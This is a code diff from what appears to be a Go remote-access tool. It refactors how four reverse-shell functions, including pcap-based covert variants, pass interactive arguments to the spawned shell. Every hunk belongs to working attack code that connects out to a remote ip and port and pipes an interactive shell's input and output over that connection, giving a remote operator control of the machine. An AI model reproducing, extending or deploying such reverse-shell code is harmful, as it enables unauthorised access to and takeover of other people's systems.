@@ -30,7 +30,7 @@ func OpenReverseShell(ip, port string) error {
 	}
 	defer conn.Close() // Close connection when function returns
 
-	cmd := exec.Command(getShell(), "-i")
+	cmd := exec.Command(getShell(), getShellInteractiveArgs()...)
 	cmd.Stdin = conn
 	cmd.Stdout = conn
 	cmd.Stderr = conn
@@ -51,7 +51,7 @@ func OpenReverseShellPty(ip, port string) error {
 	}
 	defer conn.Close() // Close connection when function returns
 
-	cmd := exec.Command(getShell(), "-i")
+	cmd := exec.Command(getShell(), getShellInteractiveArgs()...)
 
 	ptmx, err := pty.Start(cmd)
 	if err != nil {
@@ -145,7 +145,7 @@ func OpenPcapReverseShell(msg *message.Message) error {
 		conn.Close()
 	}()
 
-	return runPcapShell(exec.Command(getShell(), "-i"), conn)
+	return runPcapShell(exec.Command(getShell(), getShellInteractiveArgs()...), conn)
 }
 
 // runPcapShellPty owns stdin copying so process exit does not wait for network EOF.
@@ -240,5 +240,5 @@ func OpenPcapReverseShellPty(msg *message.Message) error {
 		conn.Close()
 	}()
 
-	return runPcapShellPty(exec.Command(getShell(), "-i"), conn)
+	return runPcapShellPty(exec.Command(getShell(), getShellInteractiveArgs()...), conn)
 }
